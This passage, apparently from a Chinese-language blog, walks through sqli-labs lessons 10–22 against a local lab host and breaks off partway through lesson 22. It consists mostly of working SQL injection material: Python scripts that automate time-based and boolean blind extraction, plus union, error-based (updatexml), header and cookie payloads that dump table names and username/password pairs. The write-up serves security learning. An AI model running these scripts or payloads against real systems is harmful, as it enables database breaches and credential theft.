class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">import requests <span class="keyword">as</span> req</span><br><span class="line">import string</span><br><span class="line">import random</span><br><span class="line">import <span class="type">time</span></span><br><span class="line">def time_injection_add(url):</span><br><span class="line">    str_head <span class="operator">=</span> &quot;the_data_is:...&quot;</span><br><span class="line">    headers = &#123;</span><br><span class="line">        &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36&#x27;&#125;</span><br><span class="line">    py_dict = &#123;</span><br><span class="line">        <span class="string">&#x27;str1&#x27;</span>: <span class="string">&#x27;?id=1\&quot; and if(ord(substr((select database()),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(4),1) -- +&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;str2&#x27;</span>: <span class="string">&#x27;?id=1\&quot; and if(ord(substr((select group_concat(table_name) from information_schema.tables where table_schema=\&#x27;</span>security\<span class="string">&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(4),1) -- +&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;str3&#x27;</span>: <span class="string">&#x27;?id=1\&quot; and if(ord(substr((select group_concat(concat(username,0x7e,password)) from users),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(4),1) -- +&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">        the_max<span class="operator">=</span><span class="number">127</span>;the_min<span class="operator">=</span><span class="number">32</span></span><br><span class="line">        while the_min<span class="operator">&lt;</span>the_max:</span><br><span class="line">            mid<span class="operator">=</span>(the_max<span class="operator">+</span>the_min)<span class="operator">&gt;&gt;</span><span class="number">1</span></span><br><span class="line">            payload_str<span class="operator">=</span>url<span class="operator">+</span>py_dict[<span class="string">&#x27;str1&#x27;</span>].format(i,mid)</span><br><span class="line">            start_time<span class="operator">=</span>time.time()</span><br><span class="line">            req1<span class="operator">=</span>req.get(payload_str,headers)</span><br><span class="line">            next_time<span class="operator">=</span>time.time()</span><br><span class="line">            if next_time<span class="operator">-</span>start_time<span class="operator">&gt;</span><span class="number">3</span>:</span><br><span class="line">                the_min<span class="operator">=</span>mid</span><br><span class="line">                if the_max<span class="operator">-</span>the_min<span class="operator">=</span><span class="operator">=</span><span class="number">1</span>: #因为我写的这种算法的缺陷导致如果真实值一开始就比中间值大的话，会卡在两者相差<span class="number">1</span>的点，死循环,因为本人没学过算法，所以不知道如何更好的解决这个问题，只能加上这段奇怪的代码</span><br><span class="line">                    mid<span class="operator">=</span>the_min<span class="operator">+</span><span class="number">1</span></span><br><span class="line">                    break</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                the_max<span class="operator">=</span>mid</span><br><span class="line">        str_head<span class="operator">=</span>str_head<span class="operator">+</span>chr(mid)</span><br><span class="line">        print(str_head)</span><br><span class="line"></span><br><span class="line">if __name__<span class="operator">=</span><span class="operator">=</span>&quot;__main__&quot;:</span><br><span class="line">    url<span class="operator">=</span>&quot;http://sqli/Less-10/&quot;</span><br><span class="line">    #booler_injection(url)</span><br><span class="line">    #time_injection(url)</span><br><span class="line">    time_injection_add(url)</span><br></pre></td></tr></table></figure><p>本人简单学习了一下二分查找的算法，优化了一下代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="string">&#x27; union select 1,2 #</span></span><br><span class="line"><span class="string">username=&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database()#</span><br><span class="line">username<span class="operator">=</span><span class="string">&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27;#</span></span><br><span class="line"><span class="string">username=&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name) <span class="keyword">from</span>  information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>#</span><br><span class="line">username<span class="operator">=</span><span class="string">&#x27; union select 1,group_concat(concat(username,0x7e,password)) from</span></span><br><span class="line"><span class="string">users#</span></span><br><span class="line"><span class="string">password=123</span></span><br></pre></td></tr></table></figure><h3 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span>adn&quot;) union select 1,2#</span><br><span class="line">username=adn&quot;) <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database()#</span><br><span class="line">username<span class="operator">=</span>adn&quot;) union select 1,group_concat(table_name) from information_schema.tables where table_schema=&quot;security&quot;#</span><br><span class="line">username=adn&quot;) <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span>&quot;users&quot;#</span><br><span class="line">username<span class="operator">=</span>adm&quot;) union select 1,group_concat(concat(username,0x7e,password)) from users#</span><br><span class="line">password=123</span><br></pre></td></tr></table></figure><h3 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span>admin<span class="string">&#x27;) || updatexml(1,concat(0x7e,database(),0x7e),1)-- +</span></span><br><span class="line"><span class="string">username=admin&#x27;</span>) <span class="operator">||</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span>),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">-- +</span></span><br><span class="line">username<span class="operator">=</span>admin<span class="string">&#x27;) || updatexml(1,substr(concat(0x7e,(select group_concat(column_name) from  information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;),0x7e),1,32),1)-- +</span></span><br></pre></td></tr></table></figure><h3 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h3><h4 id="二分搜索bool盲注"><a href="#二分搜索bool盲注" class="headerlink" title="二分搜索bool盲注"></a>二分搜索bool盲注</h4><p>加上了二分搜索的bool盲注，速度相当可以</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">import requests <span class="keyword">as</span> req</span><br><span class="line">import <span class="type">time</span></span><br><span class="line"></span><br><span class="line">def bool_injection(url,payld_dict):</span><br><span class="line">    the_data<span class="operator">=</span><span class="string">&#x27;the_date:...&#x27;</span></span><br><span class="line">    headers=&#123;</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">        the_min<span class="operator">=</span><span class="number">32</span>;the_max<span class="operator">=</span><span class="number">127</span></span><br><span class="line">        while the_min<span class="operator">&lt;</span>the_max:</span><br><span class="line">            mid<span class="operator">=</span>(the_max<span class="operator">+</span>the_min)<span class="operator">&gt;&gt;</span><span class="number">1</span></span><br><span class="line">            post_data = &#123;</span><br><span class="line">                <span class="string">&#x27;uname&#x27;</span>: payld_dict[<span class="string">&#x27;pyld3&#x27;</span>].format(i,mid),</span><br><span class="line">                <span class="string">&#x27;passwd&#x27;</span>: <span class="string">&#x27;123&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">            req1<span class="operator">=</span>req.post(url,post_data,headers)</span><br><span class="line">            if <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&#x27;</span> <span class="keyword">in</span> req1.text:</span><br><span class="line">                the_min<span class="operator">=</span>mid</span><br><span class="line">                if the_max <span class="operator">-</span> the_min <span class="operator">=</span><span class="operator">=</span> <span class="number">1</span>:  # 因为我写的这种算法的缺陷导致如果真实值一开始就比中间值大的话，会卡在两者相差<span class="number">1</span>的点，死循环,因为本人没学过算法，所以不知道如何更好的解决这个问题，只能加上这段奇怪的代码</span><br><span class="line">                    mid <span class="operator">=</span> the_min <span class="operator">+</span> <span class="number">1</span></span><br><span class="line">                    break</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                the_max<span class="operator">=</span>mid</span><br><span class="line">        the_data<span class="operator">=</span>the_data<span class="operator">+</span>chr(mid)</span><br><span class="line">        print(the_data)</span><br><span class="line">if __name__<span class="operator">=</span><span class="operator">=</span>&quot;__main__&quot;:</span><br><span class="line">    url<span class="operator">=</span>&quot;http://sqli/Less-14/&quot;</span><br><span class="line">    payld_dict=&#123;</span><br><span class="line">        <span class="string">&#x27;pyld1&#x27;</span>:<span class="string">&#x27;admin\&quot; and ord(substr((select database()),&#123;0&#125;,1))&gt;&#123;1&#125; -- + &#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;pyld2&#x27;</span>:<span class="string">&#x27;admin\&quot; and ord(substr((select group_concat(table_name) from information_schema.tables where table_schema=\&#x27;</span>security\<span class="string">&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;-- +&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;pyld3&#x27;</span>:<span class="string">&#x27;admin\&quot; and ord(substr((select group_concat(column_name) from information_schema.columns where table_name=\&#x27;</span>users\<span class="string">&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;-- +&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    bool_injection(url,payld_dict)</span><br></pre></td></tr></table></figure><h3 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">import requests <span class="keyword">as</span> req</span><br><span class="line">import <span class="type">time</span></span><br><span class="line"></span><br><span class="line">def bool_injection(url,payld_dict):</span><br><span class="line">    the_data<span class="operator">=</span><span class="string">&#x27;the_date:...&#x27;</span></span><br><span class="line">    headers=&#123;</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">        the_min<span class="operator">=</span><span class="number">32</span>;the_max<span class="operator">=</span><span class="number">127</span></span><br><span class="line">        while the_min<span class="operator">&lt;</span>the_max:</span><br><span class="line">            mid<span class="operator">=</span>(the_max<span class="operator">+</span>the_min)<span class="operator">&gt;&gt;</span><span class="number">1</span></span><br><span class="line">            post_data = &#123;</span><br><span class="line">                <span class="string">&#x27;uname&#x27;</span>: payld_dict[<span class="string">&#x27;pyld1&#x27;</span>].format(i,mid),</span><br><span class="line">                <span class="string">&#x27;passwd&#x27;</span>: <span class="string">&#x27;123&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">            req1<span class="operator">=</span>req.post(url,post_data,headers)</span><br><span class="line">            if <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot;  /&gt;&#x27;</span> <span class="keyword">in</span> req1.text:</span><br><span class="line">                the_min<span class="operator">=</span>mid</span><br><span class="line">                if the_max <span class="operator">-</span> the_min <span class="operator">=</span><span class="operator">=</span> <span class="number">1</span>:  # 因为我写的这种算法的缺陷导致如果真实值一开始就比中间值大的话，会卡在两者相差<span class="number">1</span>的点，死循环,因为本人没学过算法，所以不知道如何更好的解决这个问题，只能加上这段奇怪的代码</span><br><span class="line">                    mid <span class="operator">=</span> the_min <span class="operator">+</span> <span class="number">1</span></span><br><span class="line">                    break</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                the_max<span class="operator">=</span>mid</span><br><span class="line">        the_data<span class="operator">=</span>the_data<span class="operator">+</span>chr(mid)</span><br><span class="line">        print(the_data)</span><br><span class="line">if __name__<span class="operator">=</span><span class="operator">=</span>&quot;__main__&quot;:</span><br><span class="line">    url<span class="operator">=</span>&quot;http://sqli/Less-15/&quot;</span><br><span class="line">    payld_dict=&#123;</span><br><span class="line">        &#x27;pyld1&#x27;:&#x27;admin\&#x27; and ord(substr((select database()),&#123;0&#125;,1))&gt;&#123;1&#125; -- + &#x27;,</span><br><span class="line">        &#x27;pyld2&#x27;:&#x27;admin\&#x27; and ord(substr((select group_concat(table_name) from information_schema.tables where table_schema=\&#x27;security\&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;-- +&#x27;,</span><br><span class="line">        &#x27;pyld3&#x27;:&#x27;admin\&#x27; and ord(substr((select group_concat(column_name) from information_schema.columns where table_name=\&#x27;users\&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;-- +&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">    bool_injection(url,payld_dict)</span><br></pre></td></tr></table></figure><h3 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">import requests <span class="keyword">as</span> req</span><br><span class="line">import <span class="type">time</span></span><br><span class="line"></span><br><span class="line">def bool_injection(url,payld_dict):</span><br><span class="line">    the_data<span class="operator">=</span><span class="string">&#x27;the_date:...&#x27;</span></span><br><span class="line">    headers=&#123;</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">        the_min<span class="operator">=</span><span class="number">32</span>;the_max<span class="operator">=</span><span class="number">127</span></span><br><span class="line">        while the_min<span class="operator">&lt;</span>the_max:</span><br><span class="line">            mid<span class="operator">=</span>(the_max<span class="operator">+</span>the_min)<span class="operator">&gt;&gt;</span><span class="number">1</span></span><br><span class="line">            post_data = &#123;</span><br><span class="line">                <span class="string">&#x27;uname&#x27;</span>: payld_dict[<span class="string">&#x27;pyld1&#x27;</span>].format(i,mid),</span><br><span class="line">                <span class="string">&#x27;passwd&#x27;</span>: <span class="string">&#x27;123&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">            req1<span class="operator">=</span>req.post(url,post_data,headers)</span><br><span class="line">            if <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot;  /&gt;&#x27;</span> <span class="keyword">in</span> req1.text:</span><br><span class="line">                the_min<span class="operator">=</span>mid</span><br><span class="line">                if the_max <span class="operator">-</span> the_min <span class="operator">=</span><span class="operator">=</span> <span class="number">1</span>:  # 因为我写的这种算法的缺陷导致如果真实值一开始就比中间值大的话，会卡在两者相差<span class="number">1</span>的点，死循环,因为本人没学过算法，所以不知道如何更好的解决这个问题，只能加上这段奇怪的代码</span><br><span class="line">                    mid <span class="operator">=</span> the_min <span class="operator">+</span> <span class="number">1</span></span><br><span class="line">                    break</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                the_max<span class="operator">=</span>mid</span><br><span class="line">        the_data<span class="operator">=</span>the_data<span class="operator">+</span>chr(mid)</span><br><span class="line">        print(the_data)</span><br><span class="line">if __name__<span class="operator">=</span><span class="operator">=</span>&quot;__main__&quot;:</span><br><span class="line">    url<span class="operator">=</span>&quot;http://sqli/Less-16/&quot;</span><br><span class="line">    payld_dict=&#123;</span><br><span class="line">        <span class="string">&#x27;pyld1&#x27;</span>:<span class="string">&#x27;admin\&quot;) and ord(substr((select database()),&#123;0&#125;,1))&gt;&#123;1&#125; -- + &#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;pyld2&#x27;</span>:<span class="string">&#x27;admin\&quot;) and ord(substr((select group_concat(table_name) from information_schema.tables where table_schema=\&#x27;</span>security\<span class="string">&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;-- +&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;pyld3&#x27;</span>:<span class="string">&#x27;admin\&quot;) and ord(substr((select group_concat(column_name) from information_schema.columns where table_name=\&#x27;</span>users\<span class="string">&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;-- +&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    bool_injection(url,payld_dict)</span><br></pre></td></tr></table></figure><h3 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h3><h4 id="update注入"><a href="#update注入" class="headerlink" title="update注入"></a>update注入</h4><p>最后查询数据时用到了派生表的语法</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span>admin</span><br><span class="line"><span class="keyword">new</span> password <span class="operator">=</span><span class="string">&#x27; || updatexml(1,concat(0x7e,(select database()),0x7e),1)-- +</span></span><br><span class="line"><span class="string">new password =&#x27;</span> <span class="operator">||</span> updatexml(<span class="number">1</span>,<span class="keyword">left</span>(concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span>),<span class="number">0x7e</span>),<span class="number">32</span>),<span class="number">1</span>)<span class="comment">-- +</span></span><br><span class="line"><span class="keyword">new</span> password <span class="operator">=</span><span class="string">&#x27; || updatexml(1,left(concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;),0x7e),32),1)-- +</span></span><br><span class="line"><span class="string">new password=&#x27;</span> <span class="operator">||</span> updatexml(<span class="number">1</span>,<span class="keyword">left</span>(concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> group_concat(concat(username,<span class="number">0x7e</span>,password)) <span class="keyword">from</span> security.users)a),<span class="number">0x7e</span>),<span class="number">32</span>),<span class="number">1</span>)<span class="comment">-- +</span></span><br></pre></td></tr></table></figure><h3 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h3><p>head头注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">User</span><span class="operator">-</span>Agent: <span class="string">&#x27; and  updatexml(1,left(concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27;),0x7e),32),1) or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br><span class="line"><span class="keyword">User</span><span class="operator">-</span>Agent: <span class="string">&#x27; and updatexml(1,left(concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;),0x7e),32),1) or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Referer: <span class="string">&#x27; and  updatexml(1,left(concat(0x7e,(select database()),0x7e),32),1) or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br><span class="line">Referer: <span class="number">123</span><span class="string">&#x27; and  updatexml(1,left(concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27;),0x7e),32),1) or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h3><h4 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h4><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/Less-20/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>sqli</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>24</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://sqli</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>uname=dmin&#x27; union select 1,database(),3#</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://sqli/Less-20/</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>uname=dmin&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;security&#x27;#</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>uname=dmin&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27;#</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>uname=dmin&#x27; union select 1,group_concat(concat(username,0x7e,password)),3 from  users#</span><br></pre></td></tr></table></figure><h3 id="Less-21"><a href="#Less-21" class="headerlink" title="Less-21"></a>Less-21</h3><h4 id="cookie-base64编码"><a href="#cookie-base64编码" class="headerlink" title="cookie +base64编码"></a>cookie +base64编码</h4><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/Less-21/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>sqli</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>24</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://sqli</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>uname=YWRtbicpIHVuaW9uIHNlbGVjdCAxLGRhdGFiYXNlKCksMyM=</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://sqli/Less-21/</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>uname=YWRtbicpIHVuaW9uIHNlbGVjdCAxLGRhdGFiYXNlKCksMyM= #admn&#x27;) union select 1,database(),3#</span><br></pre></td></tr></table></figure><h3 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST <span class="operator">/</span>Less<span class="number">-22</span><span class="operator">/</span> HTTP<span class="operator">/</span><span class="number">1.1</span></span><br><span class="line">Host: sqli</span><br><span class="line"><span class="keyword">User</span><span class="operator">-</span>Agent: Mozilla<span class="operator">/</span><span class="number">5.0</span> 